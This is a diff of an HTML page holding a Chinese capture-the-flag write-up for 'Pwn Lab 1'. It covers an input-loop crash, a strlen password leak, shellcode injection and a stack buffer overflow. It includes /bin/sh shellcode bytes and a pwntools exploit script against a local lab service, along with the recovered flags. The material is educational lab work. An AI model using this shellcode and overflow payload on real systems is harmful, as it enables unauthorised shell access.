@@ -408,6 +408,8 @@
       
         
       
+        
+      
     
     
       
@@ -688,6 +690,65 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ADS/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    DS
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            DS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -713,8 +774,8 @@
   
 
 
-<h1 id="pwn-lab-1">Pwn Lab 1<a class="headerlink" href="#pwn-lab-1" title="Permanent link">&para;</a></h1>
-<h2 id="1-task-1">1. Task 1<a class="headerlink" href="#1-task-1" title="Permanent link">&para;</a></h2>
+<div><h1 id="pwn-lab-1">Pwn Lab 1<a class="headerlink" href="#pwn-lab-1" title="Permanent link">¶</a></h1>
+<h2 id="1-task-1">1. Task 1<a class="headerlink" href="#1-task-1" title="Permanent link">¶</a></h2>
 <p>观察代码，检索出可能存在漏洞的部分：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
@@ -725,11 +786,11 @@
 <span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
 <span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
 <span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-0-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Input your decimal number: &quot;</span><span class="p">);</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Input your decimal number: "</span><span class="p">);</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
 <a id="__codelineno-0-3" name="__codelineno-0-3"></a>
-<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;What do you want to turn it into: &quot;</span><span class="p">);</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"What do you want to turn it into: "</span><span class="p">);</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
 <a id="__codelineno-0-6" name="__codelineno-0-6"></a>
 <a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">pow</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span>
@@ -737,11 +798,11 @@
 <a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">    </span><span class="p">}</span>
 </code></pre></div></td></tr></table></div>
 <p>代码没有对输入做判断，所以可以构造特殊的输入让程序陷入死循环。a &lt;= pow(b, i)时跳出，所以只需要让a&gt;pow(b, i)恒成立即可，例如，a取一个大于1的整数，b取0，pow的部分永远是1，这样程序就不会退出，于是有：</p>
-<p><img alt="1720430674452" src="../image/PwnLab1/1720430674452.png" /></p>
+<p><img alt="1720430674452" src="../image/PwnLab1/1720430674452.png"></p>
 <p>得到flag：AAA{pr0GraM_C4n_ea5ilY_crAsH}</p>
 <p>本题可以纯交互完成，所以没有附上代码。</p>
-<p><img alt="1720430900575" src="../image/PwnLab1/1720430900575.png" /></p>
-<h2 id="2-task-2">2. Task 2<a class="headerlink" href="#2-task-2" title="Permanent link">&para;</a></h2>
+<p><img alt="1720430900575" src="../image/PwnLab1/1720430900575.png"></p>
+<h2 id="2-task-2">2. Task 2<a class="headerlink" href="#2-task-2" title="Permanent link">¶</a></h2>
 <p>检查代码，这是一个登录程序，有两个用户，分别为"user"和"admin"，因此需要想办法找到密码，检查密码输入的逻辑，发现代码使用了 <code>read(STDIN_FILENO,buf,BUFFER_SIZE);</code>而最后输出的时候有 <code>printf("you input password as %s (len %d)\n",password,strlen(password));</code>，使用了strlen函数，而这个函数默认以第一个遇到的'/0'为结尾，如果没有遇到则会一直输出，直到遇到'/0'。而代码中变量定义是挨在一起的：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
 <span class="normal"><a href="#__codelineno-1-2">2</a></span>
@@ -750,16 +811,16 @@
 <a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kt">char</span><span class="w"> </span><span class="n">password_verify</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
 </code></pre></div></td></tr></table></div>
 <p>说明在内存中输入的密码和真正的密码是存在相邻的位置的，通过构造无结尾的字符就能使程序输出真正的密码：</p>
-<p><img alt="1720432627684" src="../image/PwnLab1/1720432627684.png" /></p>
+<p><img alt="1720432627684" src="../image/PwnLab1/1720432627684.png"></p>
 <p>然后再输入真正的密码登入，拿到第一部分的flag：AAA{Oh_D1rTy_sta</p>
-<p><img alt="1720432818807" src="../image/PwnLab1/1720432818807.png" /></p>
+<p><img alt="1720432818807" src="../image/PwnLab1/1720432818807.png"></p>
 <p>如法炮制拿到admin的密码,然后重新登录，用cat拿到第二部分的flag：CK_Ne3d_C1a4n}</p>
-<p><img alt="1720440583893" src="../image/PwnLab1/1720440583893.png" /></p>
+<p><img alt="1720440583893" src="../image/PwnLab1/1720440583893.png"></p>
 <p>完整的flag为：AAA{Oh_D1rTy_staCK_Ne3d_C1a4n}</p>
-<p><img alt="1720440652565" src="../image/PwnLab1/1720440652565.png" /></p>
-<h2 id="3-task-3">3. Task 3<a class="headerlink" href="#3-task-3" title="Permanent link">&para;</a></h2>
+<p><img alt="1720440652565" src="../image/PwnLab1/1720440652565.png"></p>
+<h2 id="3-task-3">3. Task 3<a class="headerlink" href="#3-task-3" title="Permanent link">¶</a></h2>
 <p>对文件进行反汇编，可以看出：这个代码要求我们在实现一些计算功能的代码后，以汇编的形式传入，程序会用我们提供的函数进行计算只有全部通过了才能拿到flag1：</p>
-<p><img alt="1720441173263" src="../image/PwnLab1/1720441173263.png" /></p>
+<p><img alt="1720441173263" src="../image/PwnLab1/1720441173263.png"></p>
 <p>因此，我们需要先得到这些运算的汇编代码，我们将所有功能写进一个c文件中：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
@@ -881,20 +942,20 @@
 <span class="normal"><a href="#__codelineno-4-2">2</a></span>
 <span class="normal"><a href="#__codelineno-4-3">3</a></span>
 <span class="normal"><a href="#__codelineno-4-4">4</a></span>
-<span class="normal"><a href="#__codelineno-4-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">add_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x0f\x1e\xfa\x8d\x04\x37\xc3</span><span class="s2">&quot;</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">sub_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x29\xf0\xc3</span><span class="s2">&quot;</span>
-<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="n">and_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x21\xf0\xc3</span><span class="s2">&quot;</span>
-<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="n">or_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x09\xf0\xc3</span><span class="s2">&quot;</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="n">xor_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x31\xf0\xc3</span><span class="s2">&quot;</span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">add_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x8d\x04\x37\xc3</span><span class="s2">"</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">sub_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x29\xf0\xc3</span><span class="s2">"</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="n">and_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x21\xf0\xc3</span><span class="s2">"</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="n">or_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x09\xf0\xc3</span><span class="s2">"</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="n">xor_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf3\x0f\x1e\xfa\x89\xf8\x31\xf0\xc3</span><span class="s2">"</span>
 </code></pre></div></td></tr></table></div>
 <p>最后得到：</p>
-<p><img alt="1720442195091" src="../image/PwnLab1/1720442195091.png" /></p>
+<p><img alt="1720442195091" src="../image/PwnLab1/1720442195091.png"></p>
 <p>所以flag的第一部分为：AAA{SheL1c0de_T0</p>
 <p>正常按照程序流程走的话只能拿到第一部分的flag，既然程序给了我们执行任意代码的能力，就需要想办法调出shell来找到第二部分的flag了，为此需要使用shellcode，通过查询database找到了我们需要的shellcode：<code>shellcode=b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"</code></p>
 <p>传入程序调出shell，最后找到flag的第二部分：_9E7_All_F1ag5}</p>
-<p><img alt="1720442500125" src="../image/PwnLab1/1720442500125.png" /></p>
+<p><img alt="1720442500125" src="../image/PwnLab1/1720442500125.png"></p>
 <p>完整的flag为：AAA{SheL1c0de_T0_9E7_All_F1ag5}</p>
-<h2 id="4-task-4">4. Task 4<a class="headerlink" href="#4-task-4" title="Permanent link">&para;</a></h2>
+<h2 id="4-task-4">4. Task 4<a class="headerlink" href="#4-task-4" title="Permanent link">¶</a></h2>
 <p>检查.c文件的漏洞：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
@@ -923,13 +984,13 @@
 <a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">rndstr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="n">RDNKEY</span><span class="p">);</span>
 <a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 <a id="__codelineno-5-9" name="__codelineno-5-9"></a>
-<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="n">sscanf</span><span class="p">(</span><span class="n">rndstr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rndval</span><span class="p">);</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="n">sscanf</span><span class="p">(</span><span class="n">rndstr</span><span class="p">,</span><span class="w"> </span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rndval</span><span class="p">);</span>
 <a id="__codelineno-5-11" name="__codelineno-5-11"></a>
 <a id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">map_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAP_ADDR</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">rndval</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">);</span>
 <a id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="w">    </span><span class="n">mmap</span><span class="p">(</span><span class="n">map_addr</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">PROT_EXEC</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PROT_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="w"> </span><span class="n">MAP_PRIVATE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MAP_ANONYMOUS</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MAP_FIXED</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;what&#39;s your name: &quot;</span><span class="p">);</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"what's your name: "</span><span class="p">);</span>
 <a id="__codelineno-5-15" name="__codelineno-5-15"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">map_addr</span><span class="p">,</span><span class="w"> </span><span class="mi">64</span><span class="p">);</span>
-<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;try to overflow me~&quot;</span><span class="p">);</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"try to overflow me~"</span><span class="p">);</span>
 <a id="__codelineno-5-17" name="__codelineno-5-17"></a><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 <a id="__codelineno-5-18" name="__codelineno-5-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 <a id="__codelineno-5-19" name="__codelineno-5-19"></a><span class="p">}</span>
@@ -937,7 +998,7 @@
 <p>从这里可以看出，read函数输入的数据是可以执行的（PROT_EXEC），我们可以把shellcode放到这里面，用后面的gets函数实现栈溢出攻击，将函数的返回地址改到map_addr，就能够使程序跳转到我们的shellcode。因此我们需要知道，shellcode的地址和需要覆盖的字节数。</p>
 <p>MAP_ADDR的宏定义为 <code>#define MAP_ADDR 0x20000</code>，经过 <code>uint64_t map_addr = MAP_ADDR + ((rndval % 8) * 0x1000);</code>转换后得到map_addr，也就是注入的shellcode的位置，然而rndval取决于服务器的环境变量取值，需要进行爆破，好在有取模的限制，我们最多只需要8次尝试。</p>
 <p>把可执行文件放入IDA查看其汇编代码：</p>
-<p><img alt="1720491723981" src="../image/PwnLab1/1720491723981.png" /></p>
+<p><img alt="1720491723981" src="../image/PwnLab1/1720491723981.png"></p>
 <p>我们的目标是让函数回到retn语句，实现返回，调用gets前[rbp-40h]告诉了我们偏移量，而且在64位系统下还额外需要8字节的偏移量，最后使用的覆盖长度是 <code>0x40+8</code>。</p>
 <p>根据以上思路和之前查到的shellcode，可以完成以下攻击代码：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
@@ -961,7 +1022,7 @@
 <span class="normal"><a href="#__codelineno-6-19">19</a></span>
 <span class="normal"><a href="#__codelineno-6-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="c1"># 目标服务器地址和端口</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="n">target_address</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="n">target_address</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span>
 <a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="n">target_port</span> <span class="o">=</span> <span class="mi">51842</span>
 <a id="__codelineno-6-5" name="__codelineno-6-5"></a>
 <a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c1"># 连接到目标服务器</span>
@@ -970,24 +1031,24 @@
 <a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="n">shellcode_addr</span><span class="o">=</span><span class="mh">0x20000</span> <span class="o">+</span><span class="mh">0x5000</span>
 <a id="__codelineno-6-10" name="__codelineno-6-10"></a>
 <a id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="c1"># x86_64 Linux 打开shell的shellcode</span>
-<a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="s2">&quot;</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="s2">"</span>
 <a id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="c1"># 计算部分</span>
-<a id="__codelineno-6-14" name="__codelineno-6-14"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
 <a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="c1"># 发送shellcode到目标服务器</span>
-<a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;what&#39;s your name: &quot;</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
-<a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;try to overflow me~&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"what's your name: "</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"try to overflow me~"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 <a id="__codelineno-6-18" name="__codelineno-6-18"></a>
 <a id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="c1"># 切换到交互模式</span>
 <a id="__codelineno-6-20" name="__codelineno-6-20"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></td></tr></table></div>
 <p>其中0x5000的偏移量是逐个遍历得到的。由此可以进入shell，并使用cat flag命令输出flag的内容：AAA{R37_t0_guEs5_shE1Lc0d3_poS}</p>
-<p><img alt="1720492256755" src="../image/PwnLab1/1720492256755.png" /></p>
+<p><img alt="1720492256755" src="../image/PwnLab1/1720492256755.png"></p>
 <p>从而完成此题目：</p>
-<p><img alt="1720491280934" src="../image/PwnLab1/1720491280934.png" /></p>
-<h2 id="5-bonus">5. Bonus<a class="headerlink" href="#5-bonus" title="Permanent link">&para;</a></h2>
+<p><img alt="1720491280934" src="../image/PwnLab1/1720491280934.png"></p>
+<h2 id="5-bonus">5. Bonus<a class="headerlink" href="#5-bonus" title="Permanent link">¶</a></h2>
 <p>这道题目比前面的几题都简单，题目已经给出服务器的架构是x86的32位系统，而且还直接开放了代码的运行权限，所以直接把shellcode发送过去然后在对应路径找到flag即可。</p>
-<p><img alt="1721305293711" src="../image/PwnLab1/1721305293711.png" /></p>
-<p>上图中的代码可以直接跳转到指定路径并输出flag的内容，即AAA{lgm_is_a_big_turtle_qq_qun_386796080}。</p>
+<p><img alt="1721305293711" src="../image/PwnLab1/1721305293711.png"></p>
+<p>上图中的代码可以直接跳转到指定路径并输出flag的内容，即AAA{lgm_is_a_big_turtle_qq_qun_386796080}。</p></div>
 
 
 
